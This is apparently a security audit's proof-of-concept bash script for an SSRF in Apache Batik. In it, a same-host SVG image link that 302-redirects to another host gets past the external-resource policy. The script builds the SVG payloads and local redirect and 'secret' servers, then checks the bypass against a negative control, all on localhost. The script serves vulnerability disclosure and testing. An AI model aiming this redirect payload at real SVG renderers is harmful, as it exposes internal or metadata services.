#!/usr/bin/env bash
# F-1 — SSRF via HTTP-redirect bypass of the same-host external-resource policy.
# ParsedURLData.openStreamInternal follows redirects and never re-checks the post-redirect host.
# Differential oracle: a same-host <image> that 302-redirects to a DIFFERENT host is fetched,
# while a DIRECT reference to that host is blocked.  Default transcoder, DefaultExternalResourceSecurity.
# Severity: Medium baseline; High only where the renderer reaches sensitive internal/metadata endpoints.
set -uo pipefail
LAB="${BATIK_LAB_DIR:-/tmp/batik-lab}"; cd "$LAB"
CP="$(printf '%s' "$LAB/batik-1.19/lib/*"):$LAB"

cat > f1.svg <<'SVG'
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="20" height="20">
  <image width="20" height="20" xlink:href="http://127.0.0.1:8000/redir"/></svg>
SVG
cat > f1_direct.svg <<'SVG'
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="20" height="20">
  <image width="20" height="20" xlink:href="http://localhost:9999/secret"/></svg>
SVG
cat > f1srv.py <<'PY'
import http.server, socketserver, threading, time
HIT={"secret":0}
class Redir(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/redir"):
            self.send_response(302); self.send_header("Location","http://localhost:9999/secret"); self.end_headers()
        else: self.send_response(404); self.end_headers()
    def log_message(self,*a): pass
class Secret(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/secret"):
            HIT["secret"]+=1; print("INTERNAL_HIT /secret",flush=True)
        self.send_response(404); self.end_headers()
    def log_message(self,*a): pass
socketserver.TCPServer.allow_reuse_address=True
threading.Thread(target=lambda:socketserver.TCPServer(("127.0.0.1",8000),Redir).serve_forever(),daemon=True).start()
threading.Thread(target=lambda:socketserver.TCPServer(("127.0.0.1",9999),Secret).serve_forever(),daemon=True).start()
time.sleep(25); print("HITS=%d"%HIT["secret"],flush=True)
PY
python3 f1srv.py > f1.log 2>&1 & SRV=$!; sleep 1
echo "== [redirect vector] doc host 127.0.0.1, same-host /redir -> 302 -> localhost:9999/secret =="
java -cp "$CP" BatikProbe "$LAB/f1.svg" "http://127.0.0.1:8000/doc.svg" >/dev/null 2>&1
sleep 1
echo "== [negative control] same doc, DIRECT reference to localhost:9999/secret (must be blocked) =="
java -cp "$CP" BatikProbe "$LAB/f1_direct.svg" "http://127.0.0.1:8000/doc.svg" 2>&1 | grep -i "different location\|SecurityException\|CAUSE" | head -1
sleep 2
echo "== server log =="; grep -c INTERNAL_HIT f1.log | xargs echo "internal hits (redirect path):"
kill $SRV 2>/dev/null
echo "EXPECT: redirect path -> 1 internal hit ; direct path -> blocked (SecurityException)."
